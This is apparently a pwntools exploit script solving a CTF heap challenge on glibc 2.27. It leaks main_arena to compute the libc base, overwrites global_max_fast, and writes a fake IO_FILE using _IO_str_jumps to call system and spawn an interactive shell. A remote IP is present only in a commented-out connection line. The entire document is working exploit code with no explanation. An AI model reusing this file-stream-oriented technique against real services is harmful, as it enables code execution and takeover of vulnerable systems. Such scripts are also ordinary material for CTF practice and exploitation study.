from pwn import *
from LibcSearcher import *

#io=remote('47.96.90.40',12345)
#io=process('./pwn')
ld_path = "/home/wsxk/Desktop/glibc/glibc-2.27/64/lib/ld-2.27.so"
libc_path = "/home/wsxk/Desktop/ctf/libc-2.27.so"
#libc_path = "/home/wsxk/Desktop/glibc/glibc-2.27/64/lib/libc-2.27.so"
io = process([ld_path, "./pwn"], env={"LD_PRELOAD":libc_path})

elf = ELF('./pwn')
libc = ELF('libc-2.27.so')
context.log_level = 'debug'

io.recvuntil('Now you can get a big box, what size?\n')
io.sendline(str(0x1450-0x20))
io.recvuntil("Now you can get a bigger box, what size?\n")
io.sendline(str(20480))
io.recvuntil("Do you want to rename?(y/n)\n")
io.sendline('y')
#gdb.attach(io)

io.recvuntil('Now your name is:')
main_arean = u64(io.recv(6).ljust(8,b'\x00'))#-96
libc_base = main_arean -96-0x3EBC40
print('main_arena:'+hex(main_arean))
print('libc_base:'+hex(libc_base))
io.sendline(p64(main_arean)+p64(main_arean+0x1ca0-0x10))#max_fast

target_addr = libc_base + libc.symbols['_IO_list_all']
print('io_list_all:'+hex(target_addr))
io.recvuntil("Do you want to edit big box or bigger box?(1:big/2:bigger)\n")
io.sendline('1')
io.recvuntil("Let's edit, ")
bin_bash = libc_base + 0x1b40fa
io_str_jumps = libc_base + 0x3e8360

#gdb.attach(io)
fake_io_file = p64(0)*2
fake_io_file += p64(0)+p64((bin_bash-100)//2+1)
fake_io_file += p64(0)*2
fake_io_file += p64((bin_bash-100)//2)+p64(0)
fake_io_file = fake_io_file.ljust(0xb0,b'\x00')
fake_io_file += p64(0xFFFFFFFFFFFFFFFF) + p64(0)*2
fake_io_file += p64(io_str_jumps)
fake_io_file += p64(libc_base+libc.symbols['system'])
gdb.attach(io)
io.sendline(fake_io_file)

io.recvuntil('bye')
io.interactive()